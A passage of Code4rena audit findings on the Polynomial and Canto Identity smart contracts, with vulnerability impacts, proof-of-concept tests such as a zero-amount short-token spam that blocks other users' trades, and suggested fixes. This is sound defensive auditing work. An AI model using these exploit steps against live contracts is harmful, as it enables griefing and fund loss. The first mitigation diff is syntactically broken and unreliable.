[Exchange.openTrade](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L95)     1. [Exchange.closeTrade](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L108)     1. [Exchange.addCollateral](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L121)     1. [Exchange.removeCollateral](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L134)     1. [Exchange.liquidate](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L147) 1. [Exchange.getMarkPrice](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L196):     1. [Exchange._addCollateral](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L358)     1. [Exchange._removeCollateral](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L384)     1. [KangarooVault.getTokenPrice](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L353)     1. [ShortCollateral.liquidate](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/ShortCollateral.sol#L133)     1. [ShortCollateral.getMinCollateral](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/ShortCollateral.sol#L163)     1. [ShortCollateral.canLiquidate](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/ShortCollateral.sol#L193)     1. [ShortCollateral.maxLiquidatableDebt](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/ShortCollateral.sol#L216)     1. [LiquidityPool.orderFee](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L388)     1. [LiquidityPool.getMarkPrice](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L405)         1. [LiquidityPool.getTokenPrice](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L352)         1. [LiquidityPool.openLong](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L437)         1. [LiquidityPool.closeLong](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L469)         1. [LiquidityPool.openShort](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L501)         1. [LiquidityPool.closeShort](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L533)         1. [LiquidityPool.liquidate](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L558)         1. [KangarooVault.removeCollateral](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L437)         1. [KangarooVault._openPosition](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L568)  As it can be seen, this bug affects multiple critical part of the protocol, calculating the correct mark price as well as updating the funding rate is essential for the protocol correct behavior.  ## Mitigation steps Simply replace current `wad` operation for a simple multiplication  ```diff     function getMarkPrice() public view override returns (uint256 markPrice, bool isInvalid) {         // Get base asset price from oracles         (uint256 baseAssetPrice, bool invalid) = pool.baseAssetPrice();         isInvalid = invalid;          // Get funding rate per second         // max 1% or 1e16         (int256 fundingRate,) = getFundingRate();         fundingRate = fundingRate / 1 days;          int256 currentTimeStamp = int256(block.timestamp);         int256 fundingLastUpdatedTimestamp = int256(fundingLastUpdated);  -       int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp)); +       int256 totalFunding = fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp);         int256 normalizationUpdate = 1e18 - totalFunding;         uint256 newNormalizationFactor = normalizationFactor.mulWadDown(uint256(normalizationUpdate));          uint256 squarePrice = baseAssetPrice.mulDivDown(baseAssetPrice, PRICING_CONSTANT);         markPrice = squarePrice.mulWadDown(newNormalizationFactor);     } ```  ```diff     function _updateFundingRate() internal {         (int256 fundingRate,) = getFundingRate();                  fundingRate = fundingRate / 1 days;          int256 currentTimeStamp = int256(block.timestamp);         int256 fundingLastUpdatedTimestamp = int256(fundingLastUpdated);  -       int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp)); +       int256 totalFunding = fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp);                  int256 normalizationUpdate = 1e18 - totalFunding;          normalizationFactor = normalizationFactor.mulWadDown(uint256(normalizationUpdate));                  emit UpdateFundingRate(fundingLastUpdated, normalizationFactor);         fundingLastUpdated = block.timestamp;     } ``` "}, {"title": "Possible spamming attack in opening or closing Long or Short Positions in Exchange.openTrade", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/79", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-14"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L236 https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L248   # Vulnerability details  ## Impact One user that wants to open a short position shall not have a long position already opened and viceversa.  This is the check for opening a long position:          if (params.isLong) {             uint256 shortPositions = shortToken.balanceOf(msg.sender);             require(shortPositions == 0, \"Short position must be closed before opening\");  This is the check for opening a short position:          } else {             uint256 holdings = powerPerp.balanceOf(msg.sender);             require(holdings == 0, \"Long position must be closed before opening\");  The issue is that anyone can open a short position with value 0 without binding any collateral and then spamming the short token to user that would like to open a position. Neither in `Exchange._openTrade` or `ShortToken.sol.adjustPosition` there's a check the amount of short shall be > 0  ## Proof of Concept Copy and paste the following POC in test/Exchange.Simple.t.sol      function testMultipleShortOpen0AmountandSpam() public {     //Open a short position for user_1 with 0 shortAmount and 0 collateral         for (uint256 i = 0; i < 1000; i++) {             (uint256 positionId, Exchange.TradeParams memory tradeParams) = openShort(0, 0, user_1);             (uint256 _positionId, uint256 _shortAmount, uint256 _collateralAmount, ) = shortToken.shortPositions(positionId);          //(, uint256 _collateralAmount) = shortCollateral.userCollaterals(positionId);             assertEq(_shortAmount, 0);             assertEq(positionId, i);             assertEq(shortToken.balanceOf(user_1), i);             assertEq(_collateralAmount, 0);         }      //Open Long for user_1 and it will revert because it has at least one short opened         susd.mint(user_1, 1000e18);         Exchange.TradeParams memory tradeParamsL;         tradeParamsL.isLong = true;         tradeParamsL.amount = 1e18;         tradeParamsL.maxCost = 1000e18;     vm.startPrank(user_1);         susd.approve(address(getPool()), 1000e18);      vm.expectRevert();         exchange.openTrade(tradeParamsL);      //Perp balance of user_1 is 0            assertEq(powerPerp.balanceOf(user_1), 0);      //user_1 transfers a shortToken to user_2         uint256 positionId =55;         shortToken.safeTransferFrom(user_1, user_2, positionId);     vm.stopPrank();  //end of domain of user_1              //Open Long for user_2 it will revert because it has a short opened          susd.mint(user_2, 1000e18);         tradeParamsL.isLong = true;         tradeParamsL.amount = 2e18;         tradeParamsL.maxCost = 1000e18;         vm.startPrank(user_2);         susd.approve(address(getPool()), 1000e18);     vm.expectRevert();         exchange.openTrade(tradeParamsL);     vm.stopPrank();     assertEq(powerPerp.balanceOf(user_2),0);     }  ## Tools Used Manual review and foundry forge  ## Recommended Mitigation Steps  It's suggested to set a sensible minimum amount of tokens to be withdrawn or at least to be greater than 0."}, {"title": "Inexpedient liquidatable logic that could have half liquidable position turns fully liquidable instantly ", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/70", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-14"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L215-L240   # Vulnerability details  ## Impact In ShortCollateral.sol, the slash logic of `maxLiquidatableDebt()` is specifically too harsh to the barely unhealthy positions because `maxDebt` will be half of the position to be liquidated if `0.95e18 <= safetyRatio <= 1e18`.  Additionally, once a position turns liquidatable, the position is deemed fully liquidatable atomically in two repeated transactions.   ## Proof of Concept Supposing we resort to the following setup as denoted in [ShortCollateral.t.sol](https://github.com/code-423n4/2023-03-polynomial/blob/main/test/ShortCollateral.t.sol#L21-L23):  collRatio = 1.5e18 liqRatio = 1.3e18 liqBonus = 1e17  Collateral ratio of a position, x = (position.collateralAmount * collateralPrice) / (position.shortAmount * markPrice)  [File: ShortCollateral.sol#L230-L239](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L230-L239)  ```solidity         uint256 safetyRatioNumerator = position.collateralAmount.mulWadDown(collateralPrice);         uint256 safetyRatioDenominator = position.shortAmount.mulWadDown(markPrice);         safetyRatioDenominator = safetyRatioDenominator.mulWadDown(collateral.liqRatio);         uint256 safetyRatio = safetyRatioNumerator.divWadDown(safetyRatioDenominator);          if (safetyRatio > 1e18) return maxDebt;          maxDebt = position.shortAmount / 2;          if (safetyRatio < WIPEOUT_CUTOFF) maxDebt = position.shortAmount; ``` According to the code block above with `liqRatio` factored in:  In order to avoid being liquidated, a position will need to have a collateral ratio, `x > 1.3e18` so that `safetyRatio > (1.3 / 1.3)e18` which is `safetyRatio > 1e18`.  The position will be half liquidated if its associated collateral ratio falls in the range of `1.235e18 <= x <= 1.3e18`. To avoid full liquidation, the condition at the lower end will need to be `safetyRatio >= (1.235 / 1.3)e18` which is `safetyRatio >= 0.95e18`.  The position will be fully liquidated if `x < 1.235e18`.  Here is the unforgiving scenario:  1. Bob has a short position whose collateral ratio happens to be 1.3e18.  2. Bob's position gets half liquidated the first round ending up with a collateral ratio, x (Note: The numerator is multiplied by 0.45 because of the additional 10% `liqBonus` added to the one half collateral slashed:  (1.3 * 0.45 / 0.5)e18 = 1.17e18      3. Immediately, Bob's position becomes fully liquidatable because `x < 1.235e18`.  ## Tools Used Manual inspection  ## Recommended Mitigation Steps Consider restructuring the slashing logic such that the position turns healthy after being partially liquidated, instead of making it spiral down to the drain."}, {"title": "Supply drain of PowerPerp tokens through liquidations", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/69", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-16"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L241 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L295 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L350 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/PowerPerp.sol#L32-L38   # Vulnerability details  ## Impact contract `PowerPerp` that has Solmate's ERC20.sol inherited has zero `totalSupply` initiated by default. And, as denoted by PowerPerp.sol, `onlyExchange` can mint or burn Power (Square) Perp ERC-20 tokens:  [File: PowerPerp.sol#L32-L38](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/PowerPerp.sol#L32-L38)  ```solidity     function mint(address _user, uint256 _amt) public onlyExchange {         _mint(_user, _amt);     }      function burn(address _user, uint256 _amt) public onlyExchange {         _burn(_user, _amt);     } ``` This could run into supply issue if the source and drain have not been routed through the right channels.  ## Proof of Concept There is only one source of minting when users [open long trades](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L233-L245).  However, there are two channels users could burn the tokens, i.e. [closing long trades](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L288-L299), and [liquidating positions](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L333-L353).  It is apparent that the long traders hold the majority of the tokens although long term the tokens can be swapped for `SUSD` on the swap exchange, believing that is how `MarkPrice` derives from. Additionally, this should be where liquidators who are neither long nor short traders buy their Power Perp tokens from prior to profiting on the liquidable positions.  If liquidations get more frequent than expected due to collateral token dropping in price, [`powerPerp.burn()`](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L350) is going to both strain the Power Perp token supply and drive up the price. As a result, the amount of positions going underwater is going to increase too.  The chain effect continues since long traders will have difficulty closing their positions if their minted Power Perp tokens have earlier been swapped for `SUSD` at lower prices than now.  The situation could be worse if the scenario described above were to happen in the early phase of system launch.   ## Tools Used Manual inspection  ## Recommended Mitigation Steps Since short traders are sent the cost deducted `SUSD` when opening their positions, consider having liquidators sending in the equivalent amount of cost added `SUSD` to the liquidity pool (just like when short traders are closing their positions) instead of having Power Perp tokens burned in `_liquidate()`. This will also have a good side effect of enhancing the hedging capability of the liquidity pool."}, {"title": "Users' collateral could get stuck permanently after fully closing short trades", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/67", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-17"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortToken.sol#L82-L84 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L304   # Vulnerability details  ## Impact When completely closing a short trade, a user is supposed to input `TradeParams` such that:  `shortPosition.shortAmount == params.shortAmount` `shortPosition.collateralAmount == params.collateralAmount`  However, if cares have not been given particularly when inputting `params.collateralAmount` via a non-frontend method such as https://optimistic.etherscan.io/, a zero or a value smaller than `shortPosition.collateralAmount` could be accidentally entered. After the transaction has succeeded, the user's collateral would be permanently locked in contract `ShortCollateral`.   ## Proof of Concept As can be seen from the code block pertaining to `_closeTrade()` below, `totalShortAmount == 0` will make the require statement pass easily because [`minCollateral == 0`](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L169-L170).   [File: Exchange.sol#L310-L319](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L310-L319)  ```solidity             uint256 totalShortAmount = shortPosition.shortAmount - params.amount;             uint256 totalCollateralAmount = shortPosition.collateralAmount - params.collateralAmount;              uint256 minCollateral = shortCollateral.getMinCollateral(totalShortAmount, params.collateral);             require(totalCollateralAmount >= minCollateral, \"Not enough collateral\");              shortCollateral.sendCollateral(params.positionId, params.collateralAmount);             shortToken.adjustPosition(                 params.positionId, msg.sender, params.collateral, totalShortAmount, totalCollateralAmount             ); ``` The inadequate `params.collateralAmount` accidentally inputted is then sent to the user:  [File: ShortCollateral.sol#L106-L116](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L106-L116)   ```solidity     function sendCollateral(uint256 positionId, uint256 amount) external override onlyExchange nonReentrant {         UserCollateral storage userCollateral = userCollaterals[positionId];          userCollateral.amount -= amount;          address user = shortToken.ownerOf(positionId);          ERC20(userCollateral.collateral).safeTransfer(user, amount);          emit SendCollateral(positionId, userCollateral.collateral, amount);     } ``` Next, the user's position is adjusted such that its position is burned because of a complete position close. Note that `position.shortAmount` is assigned `0` whereas `position.collateralAmount` is assigned a non-zero value.  [File: ShortToken.sol#L79-L84](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortToken.sol#L79-L84)  ```solidity             position.collateralAmount = collateralAmount;             position.shortAmount = shortAmount;              if (position.shortAmount == 0) {                 _burn(positionId);             } ``` Because the user's ERC-721 short token is now burned, removing the forgotten/remaining collateral from the short position is going to revert on the ownership check:  [File: Exchange.sol#L388](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L388)  ```solidity         require(shortToken.ownerOf(positionId) == msg.sender); ``` ## Tools Used Manual inspection  ## Recommended Mitigation Steps Consider adding a check in `_closeTrade()` that will fully send the collateral to the user when the position is intended to be fully closed as follows:  [File: Exchange.sol#L310-L316](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/Exchange.sol#L310-L316)  ```diff             uint256 totalShortAmount = shortPosition.shortAmount - params.amount;             uint256 totalCollateralAmount = shortPosition.collateralAmount - params.collateralAmount;              uint256 minCollateral = shortCollateral.getMinCollateral(totalShortAmount, params.collateral);             require(totalCollateralAmount >= minCollateral, \"Not enough collateral\");  +            if (totalShortAmount == 0) { +                params.collateralAmount = shortPosition.collateralAmount; +            }             shortCollateral.sendCollateral(params.positionId, params.collateralAmount); ```"}, {"title": "Lack of price validity check from Synthetix results in loss of funds while liquidating", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/59", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "M-18"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L133-L134 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L388   # Vulnerability details  ## Impact Lack of a validity check while liquidating results in loss of funds, as the price could be invalid momentarily from Synthetix due to high volatility or other issues.  ## Proof of Concept  There isn't a check for `isInvalid` in `getMarkPrice` and `getAssetPrice`, which must be false before closing the liquidation:  ```solidity File: src/ShortCollateral.sol  134:         (uint256 markPrice,) = exchange.getMarkPrice(); 135:         (uint256 collateralPrice,) = synthetixAdapter.getAssetPrice(currencyKey);  ```  This check is used in other similar functions that fetch the price:  ``` File: src/ShortCollateral.sol  194:         (uint256 markPrice, bool isInvalid) = exchange.getMarkPrice(); 195:         require(!isInvalid);  205:         (collateralPrice, isInvalid) = synthetixAdapter.getAssetPrice(collateralKey); 206:         require(!isInvalid); ```  This must be present to ensure that the price fetched from Synthetix is not stale or invalid.  If this isn't the case, a liquidation could result in under-liquidation (a loss for the user) or over-liquidation (a loss for the protocol).  The same problem is also present in `LiquidityPool`:  ```solidity File: src/LiquidityPool.sol  388:         (uint256 markPrice,) = exchange.getMarkPrice(); ```  As the `markPrice` is not validated when calculating the `orderFee`.  ## Tools Used Manual review  ## Recommended Mitigation Steps Add a check to be sure that `isInvalid` is false in both `markPrice` and `collateralPrice` before liquidating."}, {"title": "Collateral removal not possible", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/16", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-19"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L262   # Vulnerability details  ## Impact If an approved collateral has later started say taking fees on transfer then protocol has no way to remove such collateral. The current deposit logic cannot handle fee on transfer token and would give more funds to user then actually obtained by contract  ## Proof of Concept 1. Assume protocol was supporting collateral X (say USDT which has fee currently set as 0) 2. After some time collateral introduces fee on transfer 3. Protocol does not have a way to remove a whitelisted collateral 4. Problem begins once user starts depositing such collateral  ``` function _addCollateral(uint256 positionId, uint256 amount) internal { ... ERC20(shortPosition.collateral).safeTransferFrom(msg.sender, address(this), amount);         ERC20(shortPosition.collateral).safeApprove(address(shortCollateral), amount);          shortToken.adjustPosition(             positionId,             msg.sender,             shortPosition.collateral,             shortPosition.shortAmount,             shortPosition.collateralAmount + amount         );         shortCollateral.collectCollateral(shortPosition.collateral, positionId, amount); ... } ```  5. In this case `amount` is transferred from user to contract but contract will only receive `amount-fees`. But contract will still adjust position with full `amount` instead of `amount-fees` which is incorrect  ## Recommended Mitigation Steps Add a way to disapprove collateral so that if in future some policy changes for a particular collateral, protocol can stop supporting it. This will it would only have to deal with existing collateral which can be wiped out slowly using public announcement"}, {"title": "If the underlying NFT is burned, getPFP may returns incorrect results", "html_url": "https://github.com/code-423n4/2023-03-canto-identity-findings/issues/209", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-05"], "target": "2023-03-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-canto-identity/blob/077372297fc419ea7688ab62cc3fd4e8f4e24e66/canto-pfp-protocol/src/ProfilePicture.sol#L94-L105   # Vulnerability details  ## Impact ProfilePicture.getPFP will return information about the underlying NFT and when `addressRegistry.getAddress(cidNFTID) ! = ERC721(nftContract).ownerOf(nftID)`, it will return 0.  But if the underlying NFT is burned, getPFP may return incorrect information ```solidity     function getPFP(uint256 _pfpID) public view returns (address nftContract, uint256 nftID) {         if (_ownerOf[_pfpID] == address(0)) revert TokenNotMinted(_pfpID);         ProfilePictureData storage pictureData = pfp[_pfpID];         nftContract = pictureData.nftContract;         nftID = pictureData.nftID;         uint256 cidNFTID = cidNFT.getPrimaryCIDNFT(subprotocolName, _pfpID);         IAddressRegistry addressRegistry = cidNFT.addressRegistry();         if (cidNFTID == 0 || addressRegistry.getAddress(cidNFTID) != ERC721(nftContract).ownerOf(nftID)) {             nftContract = address(0);             nftID = 0; // Strictly not needed because nftContract has to be always checked, but reset nevertheless to 0         }     } ``` Consider the following scenario. 1. alice mint a ProfilePicture NFT (pfp NFT) with the underlying NFT, and later mint a CidNFT by transferring the pfp NFT to the CidNFT contract.  **noting that alice does not call AddressRegistry.register to register the CidNFT.**  Since getAddress returns 0, ProfilePicture.getPFP will also return 0  ```solidity     function getAddress(uint256 _cidNFTID) external view returns (address user) {         user = ERC721(cidNFT).ownerOf(_cidNFTID);         if (_cidNFTID != cidNFTs[user]) {             // User owns CID NFT, but has not registered it             user = address(0);         }     } ``` 2. alice sends the underlying NFT to bob, who does what alice did before  3. bob sold the underlying NFT to charlie and charlie burned it for some reason, now if alice or bob calls ProfilePicture.getPFP(), it will return the contract address and id of the underlying NFT since getAddress() == ownerOf() == address(0).  When integrating with other projects, there may be bugs because getPFP returns an incorrect result   ## Proof of Concept https://github.com/code-423n4/2023-03-canto-identity/blob/077372297fc419ea7688ab62cc3fd4e8f4e24e66/canto-pfp-protocol/src/ProfilePicture.sol#L94-L105 https://github.com/code-423n4/2023-03-canto-identity/blob/077372297fc419ea7688ab62cc3fd4e8f4e24e66/canto-identity-protocol/src/AddressRegistry.sol#L86-L92 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff     function getPFP(uint256 _pfpID) public view returns (address nftContract, uint256 nftID) {         if (_ownerOf[_pfpID] == address(0)) revert TokenNotMinted(_pfpID);         ProfilePictureData storage pictureData = pfp[_pfpID];         nftContract = pictureData.nftContract;         nftID = pictureData.nftID;         uint256 cidNFTID = cidNFT.getPrimaryCIDNFT(subprotocolName, _pfpID);         IAddressRegistry addressRegistry = cidNFT.addressRegistry(); -       if (cidNFTID == 0 || addressRegistry.getAddress(cidNFTID) != ERC721(nftContract).ownerOf(nftID)) { +       if (cidNFTID == 0 || ERC721(nftContract).ownerOf(nftID) == 0 || addressRegistry.getAddress(cidNFTID) != ERC721(nftContract).ownerOf(nftID)) {             nftContract = address(0);             nftID = 0; // Strictly not needed because nftContract has to be always checked, but reset nevertheless to 0         }     } ```"}, {"title": "Incorrect emoji displaying", "html_url": "https://github.com/code-423n4/2023-03-canto-identity-findings/issues/185", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-03-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-canto-identity/blob/main/canto-bio-protocol/src/Bio.sol#L71-L83   # Vulnerability details  ## Impact Possible to split bio incorrectly, this leads to incorrect display of generated image. This image will be impossible to modify. This might leads to integration problems.   ## Proof of Concept Let's consider tokenURI function of the Bio contract. Here implemented corner case for some emojies, but current implementation doesn't handed all cases. I suppose handle all cases is redundant, erroneously, complicated and unnecessary.  Let's consider part of tokenURI code in python, this part just rewritten on Python part of Solidity code: ```python import binascii  def sol_func_same(bio):     bioTextBytes = str.encode(bio, \"utf-8\")     lengthInBytes = len(bioTextBytes)     lines = (lengthInBytes - 1) // 40 + 1     strLines = [None for _ in range(lines)]     prevByteWasContinuation = False     insertedLines = 0     bytesLines = []     bytesOffset = 0     for i in range(0, lengthInBytes):         character = bioTextBytes[i]         bytesLines.append(character)         bytesOffset += 1         if ((i > 0 and (i + 1) % 40 == 0) or prevByteWasContinuation or i == lengthInBytes - 1):             nextCharacter = 0             if (i != lengthInBytes - 1):  # \ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f                 nextCharacter = bioTextBytes[i + 1]             if (nextCharacter & 0xC0 == 0x80):                 prevByteWasContinuation = True             else:                 if (                         (nextCharacter == 0xE2 and bioTextBytes[i + 2] == 0x80 and bioTextBytes[i + 3] == 0x8D) or                         (nextCharacter == 0xF0 and                          bioTextBytes[i + 2] == 0x9F and                          bioTextBytes[i + 3] == 0x8F and                          int(bioTextBytes[i + 4]) >= 187 and                          int(bioTextBytes[i + 4]) <= 191) or                         (i >= 2 and                          bioTextBytes[i - 2] == 0xE2 and                          bioTextBytes[i - 1] == 0x80 and                          bioTextBytes[i] == 0x8D)                 ):                     prevByteWasContinuation = True                     continue                  strLines[insertedLines] = binascii.unhexlify(''.join([hex(x)[2:] for x in bytesLines])).decode(\"utf-8\")                 insertedLines += 1                 bytesLines = []                  prevByteWasContinuation = False                 bytesOffset = 0      for idx, i in enumerate(strLines):         print(idx, i)   if __name__ == \"__main__\":     sol_func_same(\"0\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f\")     print(\"===\" * 20)     sol_func_same(\"000000000000000000000000000000\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f\")  ```   The result is:  ``` 0 0\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f ============================================================ 0 000000000000000000000000000000\ud83c\udff4\udb40\udc67\udb40\udc62 1 \udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f ```  In the second line present 31 character.   but correct answer for the second case is: ``` 000000000000000000000000000000\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f ```  This happened because Eng flag presented with combination of different emojies, this case doesn't handled by contract.  Similar test might be added to the Bio.t.sol contract: ```solidity      function testSmallLine() public {         string memory text = unicode\"000\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f\";         bio.mint(text);         string memory result = bio.tokenURI(1);         console.logString(result);     }      function testLongLine() public {         string memory text = unicode\"000000000000000000000000000000\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f\";         bio.mint(text);         string memory result = bio.tokenURI(1);         console.logString(result);     } ``` You need to decode them and you'll receive the same incorrect result.   ## Tools Used  Manual audit, Python3   ## Recommended Mitigation Steps  Do not try to implement spec by themselves.  1) Add view function which is responsible to create svg image. In tokenURI call this function to generate svg result. Like this:  ```solidity function generateSvg(string memory bioText) public view returns(string) {         bytes memory bioTextBytes = bytes(bioText);         uint lengthInBytes = bioTextBytes.length;         // Insert a new line after 40 characters, taking into account unicode character         uint lines = (lengthInBytes - 1) / 40 + 1; ... ... ...         return string(abi.encodePacked(\"data:application/json;base64,\", json)); } ```  2) Add possibility to manual split by lines. i.e. with bio additionally store offsets in bytes, by which lines must be split.  ```solidity function mint(string calldata _bio, uint256[] calldata byteSplit) external { ... }  function generateSvg(string memory bioText, uint256[] memory byteSplit) public view returns(string) { ... bytes memory bioTextBytes = bytes(bioText); in for loop:     slice = bioTextBytes[i:i+1]     write slice to svg } ```  "}, {"title": "Namespace protocol: fusing cost uses hardcoded 1e18 number of units instead of ```note.decimals()```, but NOTE contract can change", "html_url": "https://github.com/code-423n4/2023-03-canto-identity-findings/issues/145", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-03-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-canto-identity/blob/main/canto-namespace-protocol/src/Namespace.sol#L113   # Vulnerability details  # [M-01] Namespace protocol: fusing cost uses hardcoded 1e18 number of units instead of ```note.decimals()```, but NOTE contract can change  Currently, Canto's $NOTE contract is an ERC20 token with 18 decimals, and the cost of fusing is calculated using a [hardcoded 1e18 number of units](https://github.com/code-423n4/2023-03-canto-identity/blob/main/canto-namespace-protocol/src/Namespace.sol#L113).   However, Namespace contract [has functionality to change NOTE address to a new one](https://github.com/code-423n4/2023-03-canto-identity/blob/main/canto-namespace-protocol/src/Namespace.sol#L196) (in case it changes on the network I assume), which introduces the possibility of the new $NOTE having a different number of decimals.  ## Impact: When fusing, users will either pay much less or much more, by order of 10 ^ ```number_of_wrong_decimals```.  Given Canto is a new blockchain and subject to potential major changes, I would say possibility of NOTE token changing to another number of decimals is definitly not something unthinkable.  ## Remediation: Use ```note.decimals()```. If gas cost is an issue, cache it every time address changes.  ``` uint256 fusingCosts = 2**(13 - numCharacters) * unitsForOneNoteToken;  function changeNoteAddress(address _newNoteAddress) external onlyOwner {     address currentNoteAddress = address(note);     note = ERC20(_newNoteAddress);     unitsforOneNoteToken = 10 ** (note.decimals());     emit 